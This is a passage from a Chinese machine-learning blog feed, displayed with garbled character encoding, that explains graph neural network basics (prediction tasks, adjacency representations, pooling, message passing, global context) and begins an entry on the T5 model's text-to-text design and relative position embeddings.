¾¹ã€‚</p><h1 id="åˆ©ç”¨å›¾è¿›è¡Œé¢„æµ‹"><a href="#åˆ©ç”¨å›¾è¿›è¡Œé¢„æµ‹" class="headerlink" title="åˆ©ç”¨å›¾è¿›è¡Œé¢„æµ‹"></a>åˆ©ç”¨å›¾è¿›è¡Œé¢„æµ‹</h1><p>Graphçš„é¢„æµ‹ä»»åŠ¡ä¸€èˆ¬åˆ†ä¸ºä¸‰ç§ï¼šgraph-level, node-level, and edge-level.</p><h2 id="Graph-level"><a href="#Graph-level" class="headerlink" title="Graph-level"></a>Graph-level</h2><p>åœ¨å›¾çº§ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯é¢„æµ‹æ•´ä¸ªå›¾çš„å±æ€§ã€‚ä¾‹å¦‚ï¼Œå¯¹äºç”¨å›¾è¡¨è¡¨ç¤ºçš„åˆ†å­ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³è¦é¢„æµ‹è¯¥åˆ†å­é—»èµ·æ¥åƒä»€ä¹ˆï¼Œæˆ–è€…å®ƒæ˜¯å¦ä¼šä¸ä¸ç–¾ç—…æœ‰å…³çš„å—ä½“ç»“åˆã€‚</p><p>æˆ‘ä»¬è¾“å…¥ä¸å«æ ‡ç­¾çš„Graphï¼Œç»è¿‡å­¦ä¹ åï¼Œç¥ç»ç½‘ç»œä¼šè¾“å‡ºä¸€ä¸ªå¸¦æœ‰ç‰¹å®šæ ‡ç­¾çš„å›¾ã€‚</p><p><img src="/Pictures/DL/GNN/graph-level.png" alt="graph-level"></p><p>è¿™ç±»ä¼¼äºCIFARçš„å›¾ç‰‡åˆ†ç±»æˆ–è€…æ–‡æœ¬çš„æ ‡ç­¾åˆ†ç±»é—®é¢˜ã€‚</p><h2 id="Node-level-task"><a href="#Node-level-task" class="headerlink" title="Node-level task"></a>Node-level task</h2><p>åŒç†ï¼Œå¯¹èŠ‚ç‚¹çš„é¢„æµ‹ä¸€èˆ¬æ˜¯é¢„æµ‹èŠ‚ç‚¹è‡ªèº«çš„ä¸€äº›å±æ€§å’Œç‰¹å¾ã€‚</p><p>æŒ‰ç…§å›¾åƒç±»æ¯”ï¼ŒèŠ‚ç‚¹çº§é¢„æµ‹é—®é¢˜ç±»ä¼¼äºå›¾åƒåˆ†å‰²ï¼Œæˆ‘ä»¬è¯•å›¾æ ‡è®°å›¾åƒä¸­æ¯ä¸ªåƒç´ çš„ä½œç”¨ã€‚å¯¹äºæ–‡æœ¬ï¼Œç±»ä¼¼çš„ä»»åŠ¡æ˜¯é¢„æµ‹å¥å­ä¸­æ¯ä¸ªå•è¯çš„è¯æ€§ï¼ˆä¾‹å¦‚åè¯ã€åŠ¨è¯ã€å‰¯è¯ç­‰ï¼‰ã€‚</p><p><img src="/Pictures/DL/GNN/node.png" alt="node-level"></p><h2 id="Edge-level-task"><a href="#Edge-level-task" class="headerlink" title="Edge-level task"></a>Edge-level task</h2><p>å¯¹è¾¹çš„é¢„æµ‹ä¸€èˆ¬æ˜¯é¢„æµ‹è¾¹è¿æ¥å“ªäº›èŠ‚ç‚¹ä»¥åŠä¿¡æ¯çš„ä¼ é€’æ–¹å¼ã€‚</p><p><img src="/Pictures/DL/GNN/edge-leve.png" alt="edge-level"></p><h1 id="æ„å»ºå›¾ç¥ç»ç½‘ç»œ"><a href="#æ„å»ºå›¾ç¥ç»ç½‘ç»œ" class="headerlink" title="æ„å»ºå›¾ç¥ç»ç½‘ç»œ"></a>æ„å»ºå›¾ç¥ç»ç½‘ç»œ</h1><h2 id="å›¾çš„æ•°æ®ç»“æ„"><a href="#å›¾çš„æ•°æ®ç»“æ„" class="headerlink" title="å›¾çš„æ•°æ®ç»“æ„"></a>å›¾çš„æ•°æ®ç»“æ„</h2><p>åœ¨æ·±åº¦å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬çš„æ•°æ®ä¸€èˆ¬ä»¥å¼ é‡å½¢å¼å‡ºç°ã€‚å¯¹äºå›¾ï¼Œæœ€å¤šåŒ…å«å››ç§ç±»å‹çš„ä¿¡æ¯ï¼šèŠ‚ç‚¹ã€è¾¹ã€å…¨å±€ã€è¿æ¥æ€§ã€‚</p><p>å‰ä¸‰ä¸ªç›¸å¯¹è€Œè¨€æ¯”è¾ƒç®€å•ï¼Œä¾‹å¦‚å¯¹äºæ¯ä¸ªèŠ‚ç‚¹ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ä¸ºå…¶åˆ†é…ä¸€ä¸ªç´¢å¼• $i$ ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥æ„å»ºå‡ºä¸€ä¸ªç‰¹å¾çŸ©é˜µ $N$ , $node_{n}$ çš„ç‰¹å¾å°±å‚¨å­˜åœ¨çŸ©é˜µ $N$ ä¸­ã€‚</p><p>å›°éš¾çš„æ˜¯å¦‚ä½•è¡¨ç¤ºå›¾çš„è¿é€šæ€§ã€‚ä¸€ä¸ªç›´è§‚çš„æ–¹å¼æ˜¯ä½¿ç”¨é‚»æ¥çŸ©é˜µã€‚</p><div class="note note-info">            <p>é‚»æ¥çŸ©é˜µï¼ˆAdjacency Matrixï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºå›¾çš„ä¸€ç§å¸¸è§æ–¹æ³•ä¹‹ä¸€ã€‚å®ƒæ˜¯ä¸€ä¸ªäºŒç»´çŸ©é˜µï¼Œå…¶ä¸­çš„è¡Œå’Œåˆ—åˆ†åˆ«ä»£è¡¨å›¾ä¸­çš„èŠ‚ç‚¹ï¼Œè€ŒçŸ©é˜µçš„å…ƒç´ è¡¨ç¤ºèŠ‚ç‚¹ä¹‹é—´æ˜¯å¦å­˜åœ¨è¾¹ã€‚</p><p>å¯¹äºä¸€ä¸ªæœ‰å‘å›¾ï¼Œé‚»æ¥çŸ©é˜µçš„å…ƒç´  $A_{ij}$ è¡¨ç¤ºä»èŠ‚ç‚¹ $i$ åˆ°èŠ‚ç‚¹ $j$ æ˜¯å¦å­˜åœ¨ä¸€æ¡è¾¹ã€‚å¦‚æœå­˜åœ¨è¾¹ï¼Œåˆ™ $A_{ij}$ çš„å€¼é€šå¸¸ä¸º 1 æˆ–è€…è¡¨ç¤ºè¾¹çš„æƒé‡ï¼›å¦‚æœä¸å­˜åœ¨è¾¹ï¼Œåˆ™ $A_{ij}$ çš„å€¼é€šå¸¸ä¸º 0 æˆ–è€…å…¶ä»–è¡¨ç¤ºä¸å­˜åœ¨çš„å€¼ã€‚åœ¨æ— å‘å›¾ä¸­ï¼Œå¦‚æœèŠ‚ç‚¹ $i$ ä¸èŠ‚ç‚¹ $j$ ä¹‹é—´æœ‰è¾¹ç›¸è¿ï¼Œåˆ™ $A_{ij}$ å’Œ $A_{ji}$ éƒ½è¢«è®¾ä¸º 1ï¼ˆæˆ–è€…è¾¹çš„æƒé‡ï¼‰ï¼Œå¦åˆ™ä¸º 0ã€‚</p><p>ä¸¾ä¾‹æ¥è¯´ï¼Œå¯¹äºä¸€ä¸ªæ— å‘å›¾ï¼Œå¦‚æœå­˜åœ¨èŠ‚ç‚¹ 1 å’ŒèŠ‚ç‚¹ 2 ä¹‹é—´çš„è¾¹ï¼Œåˆ™å¯¹åº”çš„é‚»æ¥çŸ©é˜µä¸­çš„å…ƒç´  $A_{12}$ å’Œ $A_{21}$ éƒ½ä¼šè¢«è®¾ä¸º 1ã€‚è€Œå¦‚æœèŠ‚ç‚¹ 1 å’ŒèŠ‚ç‚¹ 3 ä¹‹é—´æ²¡æœ‰è¾¹ï¼Œåˆ™å¯¹åº”çš„ $A_{13}$ å’Œ $A_{31}$ å…ƒç´ éƒ½ä¼šè¢«è®¾ä¸º 0ã€‚</p>          </div><p>é‚»æ¥çŸ©é˜µçš„ä¼˜ç‚¹æ˜¯æ˜“äºç†è§£å’Œå®ç°ï¼ŒåŒæ—¶å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è¿›è¡Œä¸€äº›çŸ©é˜µè¿ç®—ï¼Œæ¯”å¦‚çŸ©é˜µä¹˜æ³•ï¼Œä»è€Œåœ¨ä¸€äº›å›¾ç®—æ³•ä¸­æä¾›äº†ä¾¿åˆ©ã€‚ç„¶è€Œï¼Œå¯¹äºå¤§è§„æ¨¡ç¨€ç–å›¾æ¥è¯´ï¼Œé‚»æ¥çŸ©é˜µä¼šå ç”¨è¾ƒå¤šçš„å†…å­˜ç©ºé—´ï¼Œå› ä¸ºå®ƒä¼šå­˜å‚¨å¤§é‡çš„é›¶å…ƒç´ ï¼Œå› æ­¤åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé‚»æ¥è¡¨ç­‰å…¶ä»–æ•°æ®ç»“æ„å¯èƒ½æ›´ä¸ºé«˜æ•ˆã€‚</p><p><img src="/Pictures/DL/GNN/adjacency_matrix.png" alt="adjacency_matrix"></p><p>å¯ä»¥çœ‹è§ï¼Œè¡¨ç¤ºå››ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„è¿æ¥å…³ç³»ï¼Œæˆ‘ä»¬å°±éœ€è¦ç›¸å½“æ•°é‡çš„çŸ©é˜µæ¥è¡¨ç¤ºã€‚</p><p>å¦ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨é‚»æ¥è¡¨ã€‚</p><p><img src="/Pictures/DL/GNN/adjacency_list.png" alt="adjacency_list"></p><p>åœ¨è¡¨ä¸­ï¼Œæˆ‘ä»¬å°†æ¯ä¸ªnodeè¿›è¡Œç¼–ç ï¼Œç„¶åä½¿ç”¨ä¸€ä¸ªtupleæ¥å‚¨å­˜ä¸¤ä¸ªnodeä¹‹é—´çš„è¿æ¥å…³ç³»ã€‚<br>ä¸Šå›¾ä¸­çš„èŠ‚ç‚¹ã€è¾¹å’Œå…¨å±€ä¿¡æ¯éƒ½å¯ä»¥ç”¨å‘é‡è¡¨ç¤ºï¼Œè€Œä¸ä¸€å®šåªæ˜¯æ ‡é‡ã€‚</p><h2 id="å›¾ç¥ç»ç½‘ç»œ"><a href="#å›¾ç¥ç»ç½‘ç»œ" class="headerlink" title="å›¾ç¥ç»ç½‘ç»œ"></a>å›¾ç¥ç»ç½‘ç»œ</h2><p>å›¾çš„æè¿°æ˜¯æ’åˆ—ä¸å˜çš„çŸ©é˜µæ ¼å¼ï¼Œæˆ‘ä»¬å°†æè¿°ä½¿ç”¨å›¾ç¥ç»ç½‘ç»œï¼ˆGNNï¼‰æ¥è§£å†³å›¾é¢„æµ‹ä»»åŠ¡ã€‚ GNN æ˜¯å¯¹å›¾çš„æ‰€æœ‰å±æ€§ï¼ˆèŠ‚ç‚¹ã€è¾¹ã€å…¨å±€ä¸Šä¸‹æ–‡ï¼‰çš„å¯ä¼˜åŒ–å˜æ¢ï¼Œå¯ä¿ç•™å›¾å¯¹ç§°æ€§ï¼ˆæ’åˆ—ä¸å˜æ€§ï¼‰ã€‚</p><p>GNN é‡‡ç”¨â€œå›¾è¾“å…¥ã€å›¾è¾“å‡ºâ€æ¶æ„ï¼Œè¿™æ„å‘³ç€è¿™äº›æ¨¡å‹ç±»å‹æ¥å—å›¾ä½œä¸ºè¾“å…¥ï¼Œå°†ä¿¡æ¯åŠ è½½åˆ°å…¶èŠ‚ç‚¹ã€è¾¹å’Œå…¨å±€ä¸Šä¸‹æ–‡ä¸­ï¼Œå¹¶é€æ­¥è½¬æ¢è¿™äº›åµŒå…¥ï¼Œè€Œä¸æ”¹å˜è¾“å…¥çš„è¿æ¥æ€§å›¾å½¢ã€‚</p><h3 id="The-simplest-GNN"><a href="#The-simplest-GNN" class="headerlink" title="The simplest GNN"></a>The simplest GNN</h3><p>æˆ‘ä»¬åˆ©ç”¨ç®€å•çš„MLPæ¥æ„å»ºGNN Layer</p><p><img src="/Pictures/DL/GNN/GNNlayer.png" alt="GNNlayer"></p><p>åœ¨ç»è¿‡å¤šä¸ªå…¨è¿æ¥å±‚çš„æ¢¯åº¦ä¸‹é™å’Œåå‘ä¼ æ’­æ›´æ–°å‚æ•°åï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€å¼ ä¸æ”¹å˜è¿æ¥æ€§ä½†æ˜¯æ”¹å˜èŠ‚ç‚¹å’Œè¾¹ã€å…¨å±€å†…å®¹çš„å›¾ä½œä¸ºè¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸è¾“å…¥å›¾ç›¸åŒçš„é‚»æ¥è¡¨å’Œç›¸åŒæ•°é‡çš„ç‰¹å¾å‘é‡æ¥æè¿° GNN çš„è¾“å‡ºå›¾ã€‚</p><p>ä¸ç¥ç»ç½‘ç»œæ¨¡å—æˆ–å±‚ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™äº› GNN å±‚å †å åœ¨ä¸€èµ·ï¼Œè·å¾—æ›´å¥½çš„æ‹Ÿåˆæ•ˆæœã€‚</p><div class="note note-info">            <p>å¤šå±‚æ„ŸçŸ¥æœºæ˜¯ä¸€ç§å¸¸è§çš„äººå·¥ç¥ç»ç½‘ç»œæ¨¡å‹ï¼Œç”±å¤šä¸ªå…¨è¿æ¥å±‚ï¼ˆFully Connected Layerï¼‰ç»„æˆï¼Œæ¯ä¸ªå…¨è¿æ¥å±‚éƒ½åŒ…å«å¤šä¸ªç¥ç»å…ƒï¼ˆæˆ–ç§°ä¸ºèŠ‚ç‚¹ï¼‰ï¼Œç›¸é‚»å±‚ä¹‹é—´çš„ç¥ç»å…ƒä¹‹é—´å…¨éƒ¨è¿æ¥ã€‚</p><p>åœ¨å›¾ç¥ç»ç½‘ç»œä¸­ï¼ŒMLP é€šå¸¸è¢«ç”¨ä½œèŠ‚ç‚¹çº§åˆ«çš„ç‰¹å¾è½¬æ¢å™¨ã€‚å…·ä½“æ¥è¯´ï¼ŒMLP æ¥æ”¶èŠ‚ç‚¹çš„ç‰¹å¾ä½œä¸ºè¾“å…¥ï¼Œå¹¶é€šè¿‡å¤šä¸ªå…¨è¿æ¥å±‚æ¥å­¦ä¹ èŠ‚ç‚¹çš„æ–°è¡¨ç¤ºã€‚è¿™äº›æ–°è¡¨ç¤ºå¯ä»¥æ•æ‰èŠ‚ç‚¹åœ¨å›¾ä¸­çš„å±€éƒ¨ç»“æ„å’Œå…¨å±€ä¿¡æ¯ï¼Œä»è€Œç”¨äºå„ç§ä»»åŠ¡ï¼Œå¦‚èŠ‚ç‚¹åˆ†ç±»ã€èŠ‚ç‚¹é¢„æµ‹ç­‰ã€‚</p><p>åœ¨ GNN ä¸­ï¼ŒMLP é€šå¸¸è¢«åº”ç”¨åœ¨æ¯ä¸ªèŠ‚ç‚¹çš„ç‰¹å¾æ›´æ–°è¿‡ç¨‹ä¸­ï¼Œä»¥å¸®åŠ©èŠ‚ç‚¹è¡¨ç¤ºå­¦ä¹ æ›´ä¸°å¯Œçš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œåœ¨å›¾å·ç§¯ç½‘ç»œï¼ˆGCNï¼‰ä¸­ï¼ŒMLP å¯ä»¥è¢«ç”¨æ¥å¯¹èŠ‚ç‚¹çš„é‚»å±…ç‰¹å¾è¿›è¡Œèšåˆå’Œå˜æ¢ï¼Œä»¥ç”Ÿæˆæ–°çš„èŠ‚ç‚¹è¡¨ç¤ºã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼ŒMLP çš„å‚æ•°é€šå¸¸æ˜¯å¯å­¦ä¹ çš„ï¼Œå®ƒä»¬ä¼šé€šè¿‡åå‘ä¼ æ’­ç®—æ³•æ¥è¿›è¡Œè®­ç»ƒï¼Œä»¥æœ€å¤§åŒ–æ¨¡å‹çš„æ€§èƒ½ã€‚</p>          </div><h3 id="Pooling"><a href="#Pooling" class="headerlink" title="Pooling"></a>Pooling</h3><p>å¦‚æœæˆ‘ä»¬è¿›è¡Œçš„åªæ˜¯ç®€å•çš„åˆ†ç±»ä»»åŠ¡ï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹æ¯ä¸ªèŠ‚ç‚¹çš„embeddingï¼ˆå³å¯¹åº”çš„å¼ é‡ï¼‰åº”ç”¨ä¸€ä¸ªçº¿æ€§åˆ†ç±»å™¨å³å¯ã€‚</p><p>ä½†æ˜¯è¿™ä»…ä»…åªåˆ©ç”¨äº†èŠ‚ç‚¹æ‰€å‚¨å­˜çš„ä¿¡æ¯ï¼Œå¹¶æ²¡æœ‰åˆ©ç”¨åˆ°è¾¹å‚¨å­˜çš„ä¿¡æ¯å’Œè¿æ¥æ€§ã€‚é€šè¿‡æ± åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥æ”¶é›†è¾¹æ‰€å‚¨å­˜çš„ä¿¡æ¯æä¾›ç»™èŠ‚ç‚¹è¿›è¡Œé¢„æµ‹ã€‚</p><p>æ± åŒ–çš„è¿‡ç¨‹åˆ†ä¸¤æ­¥è¿›è¡Œï¼š</p><ol><li>å¯¹äºè¦æ± åŒ–çš„æ¯ä¸ªé¡¹ç›®ï¼Œæ”¶é›†å¯¹åº”çš„å¼ é‡å¹¶å°†å®ƒä»¬è¿æ¥æˆä¸€ä¸ªçŸ©é˜µã€‚</li><li>é€šè¿‡æ±‚å’Œè¿ç®—æ¥å¾—åˆ°æ”¶é›†çš„ä¿¡æ¯å¼ é‡ã€‚</li></ol><p><img src="/Pictures/DL/GNN/Pooling.png" alt="Pooling"></p><p>é€šè¿‡è¿™ç§ç®€å•çš„å åŠ æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¿¡æ¯ä»èŠ‚ç‚¹ä¼ é€’åˆ°è¾¹æˆ–è€…ä»è¾¹ä¼ é€’åˆ°èŠ‚ç‚¹ã€‚</p><p>å¦‚æœæˆ‘ä»¬åªæœ‰èŠ‚ç‚¹çº§ç‰¹å¾ï¼Œå¹¶ä¸”éœ€è¦é¢„æµ‹å…¨å±€å±æ€§ï¼Œåˆ™éœ€è¦å°†æ‰€æœ‰å¯ç”¨çš„èŠ‚ç‚¹ä¿¡æ¯æ”¶é›†åœ¨ä¸€èµ·å¹¶èšåˆå®ƒä»¬ã€‚è¿™ç±»ä¼¼äº CNN ä¸­çš„å…¨å±€å¹³å‡æ± å±‚ã€‚å¯¹äºè¾¹ç¼˜ä¹Ÿå¯ä»¥è¿›è¡ŒåŒæ ·çš„æ“ä½œã€‚</p><p>æˆ‘ä»¬ç”¨ $\rho$ è¡¨ç¤ºæ± åŒ–æ“ä½œï¼Œå¹¶ç”¨ $pE_{n}\to V_{n}$ è¡¨ç¤ºä»è¾¹æ”¶é›†ä¿¡æ¯åˆ°èŠ‚ç‚¹</p><h3 id="Passing-messages"><a href="#Passing-messages" class="headerlink" title="Passing messages"></a>Passing messages</h3><p>æ¶ˆæ¯ä¼ é€’åˆ†ä¸‰ä¸ªæ­¥éª¤è¿›è¡Œï¼š</p><ol><li>å¯¹äºæ¯ä¸ªèŠ‚ç‚¹ï¼Œæˆ‘ä»¬æ”¶é›†æ‰€æœ‰ç›¸é‚»èŠ‚ç‚¹çš„ç‰¹å¾å¼ é‡</li><li>é€šè¿‡èšåˆå‡½æ•°ï¼ˆå¦‚ç®€å•çš„ç›¸åŠ ï¼‰èšåˆæ”¶é›†åˆ°çš„ä¿¡æ¯</li><li>å°†èšåˆçš„ä¿¡æ¯é€šè¿‡æ›´æ–°å‡½æ•°ä¼ é€’</li></ol><p><img src="/Pictures/DL/GNN/passing.png" alt="passing"></p><p>è¿™è®©äººæƒ³èµ·æ ‡å‡†å·ç§¯ï¼šæœ¬è´¨ä¸Šï¼Œæ¶ˆæ¯ä¼ é€’å’Œå·ç§¯æ˜¯èšåˆå’Œå¤„ç†å…ƒç´ é‚»å±…ä¿¡æ¯ä»¥æ›´æ–°å…ƒç´ å€¼çš„æ“ä½œã€‚åœ¨å›¾å½¢ä¸­ï¼Œå…ƒç´ æ˜¯èŠ‚ç‚¹ï¼Œåœ¨å›¾åƒä¸­ï¼Œå…ƒç´ æ˜¯åƒç´ ã€‚ç„¶è€Œï¼Œå›¾ä¸­ç›¸é‚»èŠ‚ç‚¹çš„æ•°é‡å¯ä»¥æ˜¯å¯å˜çš„ï¼Œè¿™ä¸æ¯ä¸ªåƒç´ å…·æœ‰å›ºå®šæ•°é‡çš„ç›¸é‚»å…ƒç´ çš„å›¾åƒä¸åŒã€‚</p><h3 id="Learning-edge-representations"><a href="#Learning-edge-representations" class="headerlink" title="Learning edge representations"></a>Learning edge representations</h3><p>å½“æˆ‘ä»¬æƒ³è¦å¯¹èŠ‚ç‚¹è¿›è¡Œé¢„æµ‹ï¼Œä½†æˆ‘ä»¬çš„æ•°æ®é›†åªæœ‰è¾¹ç¼˜ä¿¡æ¯æ—¶ï¼Œæˆ‘ä»¬åœ¨ä¸Šé¢å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨æ± åŒ–å°†ä¿¡æ¯ä»è¾¹ç¼˜è·¯ç”±åˆ°èŠ‚ç‚¹ï¼Œä½†ä»…é™äºæ¨¡å‹çš„æœ€ç»ˆé¢„æµ‹æ­¥éª¤ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¶ˆæ¯ä¼ é€’åœ¨ GNN å±‚å†…çš„èŠ‚ç‚¹å’Œè¾¹ä¹‹é—´å…±äº«ä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä¸ä¹‹å‰ä½¿ç”¨ç›¸é‚»èŠ‚ç‚¹ä¿¡æ¯ç›¸åŒçš„æ–¹å¼åˆå¹¶æ¥è‡ªç›¸é‚»è¾¹ç¼˜çš„ä¿¡æ¯ï¼Œé¦–å…ˆæ± åŒ–è¾¹ç¼˜ä¿¡æ¯ï¼Œä½¿ç”¨æ›´æ–°å‡½æ•°å¯¹å…¶è¿›è¡Œè½¬æ¢ï¼Œç„¶åå­˜å‚¨å®ƒã€‚</p><p><img src="/Pictures/DL/GNN/weavelayer.png" alt="weavelayer"></p><h3 id="Adding-global-representations"><a href="#Adding-global-representations" class="headerlink" title="Adding global representations"></a>Adding global representations</h3><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬æè¿°çš„ç½‘ç»œå­˜åœ¨ä¸€ä¸ªç¼ºé™·ï¼šå³ä½¿æˆ‘ä»¬å¤šæ¬¡åº”ç”¨æ¶ˆæ¯ä¼ é€’ï¼Œå›¾ä¸­å½¼æ­¤ç›¸è·è¾ƒè¿œçš„èŠ‚ç‚¹ä¹Ÿå¯èƒ½æ°¸è¿œæ— æ³•æœ‰æ•ˆåœ°ç›¸äº’ä¼ è¾“ä¿¡æ¯ã€‚</p><p>å¯¹äºä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ k å±‚ï¼Œä¿¡æ¯å°†æœ€å¤šä¼ æ’­ k æ­¥ã€‚</p><p>ä¸€ç§è§£å†³æ–¹æ¡ˆæ˜¯è®©æ‰€æœ‰èŠ‚ç‚¹éƒ½èƒ½å¤Ÿç›¸äº’ä¼ é€’ä¿¡æ¯ã€‚ä¸å¹¸çš„æ˜¯ï¼Œå¯¹äºå¤§å‹å›¾ï¼Œè¿™å¾ˆå¿«å°±ä¼šå˜å¾—è®¡ç®—æˆæœ¬é«˜æ˜‚ã€‚æ­¤é—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨å›¾ (U) çš„å…¨å±€è¡¨ç¤ºï¼Œæœ‰æ—¶ç§°ä¸ºä¸»èŠ‚ç‚¹æˆ–ä¸Šä¸‹æ–‡å‘é‡ï¼Œè¿™ä¸ªå…¨å±€ä¸Šä¸‹æ–‡å‘é‡è¿æ¥åˆ°ç½‘ç»œä¸­çš„æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹å’Œè¾¹ï¼Œå¹¶ä¸”å¯ä»¥å……å½“å®ƒä»¬ä¹‹é—´ä¼ é€’ä¿¡æ¯çš„æ¡¥æ¢ï¼Œæ„å»ºæ•´ä¸ªå›¾çš„è¡¨ç¤ºã€‚</p><p><img src="/Pictures/DL/GNN/Globallayer.png" alt="Globallayer"></p><p>åœ¨è¿™ä¸ªå›¾ä¸­ï¼Œæ‰€æœ‰å›¾å±æ€§éƒ½å·²ç»å­¦ä¹ äº†è¡¨ç¤ºï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨æ± åŒ–æœŸé—´é€šè¿‡è°ƒèŠ‚æˆ‘ä»¬æ„Ÿå…´è¶£çš„å±æ€§ç›¸å¯¹äºå…¶ä½™å±æ€§çš„ä¿¡æ¯æ¥åˆ©ç”¨å®ƒä»¬ã€‚ä¾‹å¦‚ï¼Œå¯¹äºä¸€ä¸ªèŠ‚ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘æ¥è‡ªç›¸é‚»èŠ‚ç‚¹çš„ä¿¡æ¯ã€è¿æ¥çš„è¾¹å’Œå…¨å±€ä¿¡æ¯ã€‚ä¸ºäº†ä½¿æ–°èŠ‚ç‚¹åµŒå…¥æ‰€æœ‰è¿™äº›å¯èƒ½çš„ä¿¡æ¯æºï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°å°†å®ƒä»¬è¿æ¥èµ·æ¥ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡çº¿æ€§æ˜ å°„å°†å®ƒä»¬æ˜ å°„åˆ°åŒä¸€ç©ºé—´å¹¶æ·»åŠ å®ƒä»¬æˆ–åº”ç”¨ç‰¹å¾è°ƒåˆ¶å±‚,è¿™å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€ç§ç‰¹å¾åŒ–æ³¨æ„åŠ›æœºåˆ¶ã€‚</p><h1 id="å…¶ä»–ç±»å‹çš„å›¾"><a href="#å…¶ä»–ç±»å‹çš„å›¾" class="headerlink" title="å…¶ä»–ç±»å‹çš„å›¾"></a>å…¶ä»–ç±»å‹çš„å›¾</h1><ul><li>å¤šè¾¹å›¾ï¼šä¸€å¯¹èŠ‚ç‚¹å¯ä»¥å…±äº«å¤šç§ç±»å‹çš„è¾¹ï¼Œå½“æˆ‘ä»¬æƒ³è¦æ ¹æ®èŠ‚ç‚¹çš„ç±»å‹å¯¹èŠ‚ç‚¹ä¹‹é—´çš„äº¤äº’è¿›è¡Œä¸åŒçš„å»ºæ¨¡æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚</li><li>åµŒå¥—å›¾ï¼šä¸€ä¸ªèŠ‚ç‚¹ä»£è¡¨ä¸€ä¸ªå›¾ï¼Œä¹Ÿç§°ä¸ºè¶…èŠ‚ç‚¹å›¾ã€‚åµŒå¥—å›¾å¯¹äºè¡¨ç¤ºå±‚æ¬¡ç»“æ„ä¿¡æ¯å¾ˆæœ‰ç”¨ã€‚</li></ul><hr><p>å‚è€ƒï¼š<br><a href="https://distill.pub/2021/gnn-intro/">https://distill.pub/2021/gnn-intro/</a></p>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>T5</title>
    <link href="/2024/03/19/T5/"/>
    <url>/2024/03/19/T5/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>T5 çš„åŸºæœ¬æ€æƒ³æ˜¯å°†æ¯ä¸ª NLP é—®é¢˜éƒ½è§†ä¸ºâ€œtext-to-textâ€é—®é¢˜ï¼Œå³å°†æ–‡æœ¬ä½œä¸ºè¾“å…¥å¹¶ç”Ÿæˆæ–°çš„æ–‡æœ¬ä½œä¸ºè¾“å‡ºï¼Œè¿™å…è®¸å°†ç›¸åŒçš„æ¨¡å‹ã€ç›®æ ‡ã€è®­ç»ƒæ­¥éª¤å’Œè§£ç è¿‡ç¨‹ï¼Œç›´æ¥åº”ç”¨äºæ¯ä¸ªä»»åŠ¡ã€‚</p><p>æ¨¡å‹å’Œæ¡†æ¶ç§°ä¸º â€œ<strong>T</strong>ext-<strong>t</strong>o-<strong>T</strong>ext <strong>T</strong>ransfer <strong>T</strong>ransformerâ€â€”â€”T5ã€‚</p><h1 id="Embedding"><a href="#Embedding" class="headerlink" title="Embedding"></a>Embedding</h1><p>T5æ¨¡å‹çš„ç»“æ„åŸºäºä¼ ç»ŸTransformeræ¨¡å‹ã€‚<br>ä½†Transformer ä½¿ç”¨æ­£ä½™å¼¦å‡½æ•°çš„ä½ç½®ç¼–ç ï¼ŒBERT ä½¿ç”¨çš„æ˜¯å­¦ä¹ åˆ°çš„ä½ç½®åµŒå…¥ï¼Œè€Œæœ¬æ–‡ä½¿ç”¨çš„æ˜¯ç›¸å¯¹ä½ç½®åµŒå…¥ã€‚</p><p>ç›¸å¯¹ä½ç½®åµŒå…¥ä¸æ˜¯å¯¹æ¯ä¸ªä½ç½®ä½¿ç”¨å›ºå®šçš„åµŒå…¥ï¼Œè€Œæ˜¯æ ¹æ® self-attention æœºåˆ¶ä¸­çš„â€œkeyâ€å’Œâ€œqueryâ€ä¹‹é—´çš„åç§»é‡ç”Ÿæˆä¸åŒçš„å­¦ä¹ åµŒå…¥ã€‚T5å°†(keyå’Œquery)ç›¸å¯¹ä½ç½®çš„æ•°å€¼åŠ åœ¨attention softmaxä¹‹å‰çš„logitsä¸Šï¼Œæ¯ä¸ªheadçš„æœ‰è‡ªå·±çš„position embeddingsï¼Œæ‰€æœ‰çš„å±‚å…±äº«ä¸€å¥—position embeddingsï¼Œæ¯ä¸€å±‚éƒ½è®¡ç®—ä¸€æ¬¡ï¼Œè®©æ¨¡å‹å¯¹ä½ç½®æ›´åŠ æ•æ„Ÿã€‚</p><h1 id="é¢„è®­ç»ƒè¿‡ç¨‹"><a 